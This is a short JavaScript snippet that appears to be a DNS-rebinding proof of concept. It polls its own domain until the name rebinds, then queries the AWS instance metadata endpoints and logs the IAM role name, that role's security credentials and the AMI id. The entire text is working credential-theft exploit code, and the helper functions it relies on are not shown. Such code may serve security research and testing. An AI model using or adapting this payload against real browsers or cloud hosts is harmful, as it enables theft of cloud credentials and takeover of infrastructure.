var role;
for(var i = 0; i < 600; ++i) {
    var req = new XMLHttpRequest();
    req.open('GET', 'http://' + document.domain + '/wait', false);
    req.send();
    role = get('http://' + document.domain + '/latest/meta-data/iam/security-credentials/');
    if(role != 'still the same host')
    	break;
}
log('Role: ' + role);
log('Security credentials: ' + get('http://' + document.domain + '/latest/meta-data/iam/security-credentials/' + role));
log('AMI id: ' + get('http://' + document.domain + '/latest/meta-data/ami-id'));
